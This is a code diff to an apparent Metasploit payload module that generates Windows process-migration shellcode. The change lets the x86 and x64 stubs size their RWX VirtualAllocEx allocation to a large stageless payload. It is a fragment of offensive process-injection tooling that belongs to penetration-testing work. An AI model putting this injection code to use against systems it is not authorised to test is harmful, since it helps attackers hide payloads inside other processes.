@@ -240,8 +240,19 @@ module Msf::Payload::Windows::PrependMigrate
       ; allocate memory in the process (VirtualAllocEx())
       ; get handle
       push 0x40                 ; RWX
-      add bh,0x10               ; ebx = 0x1000
+      add bh, 0x10              ; ebx = 0x1000
       push ebx                  ; MEM_COMMIT
+    EOS
+
+    if buf.length > 4096
+      # probably stageless, so we don't have shellcode size constraints,
+      # and so we can just set ebx to the size of the payload
+      migrate_asm << <<-EOS
+      mov ebx, #{payloadsize} ; stageless size
+      EOS
+    end
+
+    migrate_asm << <<-EOS
       push ebx                  ; size
       xor ebx,ebx
       push ebx                  ; address
@@ -474,7 +485,22 @@ module Msf::Payload::Windows::PrependMigrate
       ; get handle
       push 0x40                 ; RWX
       mov r9,0x1000             ; 0x1000 = MEM_COMMIT
+    EOS
+
+    if buf.length > 4096
+      # probably stageless, so we don't have shellcode size constraints,
+      # and so we can just set r8 to the size of the payload
+      migrate_asm << <<-EOS
+      mov r8, #{payloadsize} ; stageless size
+      EOS
+    else
+      # otherwise we'll juse reuse r9 (4096) for size
+      migrate_asm << <<-EOS
       mov r8,r9                 ; size
+      EOS
+    end
+
+    migrate_asm << <<-EOS
       xor rdx,rdx               ; address
       mov rcx, [rdi]            ; handle
       mov r10d, 0x3F9287AE      ; hash( "kernel32.dll", "VirtualAllocEx" )
